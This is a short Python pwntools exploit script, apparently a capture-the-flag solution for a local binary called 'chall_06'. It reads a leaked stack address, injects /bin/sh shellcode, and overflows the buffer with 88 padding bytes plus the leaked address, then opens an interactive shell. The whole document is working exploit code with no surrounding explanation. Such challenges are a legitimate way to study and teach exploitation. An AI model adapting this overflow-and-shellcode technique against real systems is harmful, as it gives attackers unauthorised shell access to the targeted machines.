from pwn import *
p = process('./chall_06')
p.recvuntil(':')
var = p.recv()
var = int(var, 16)
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
payload = b's' * 88 + p64(var)
p.sendline(payload)
p.interactive()
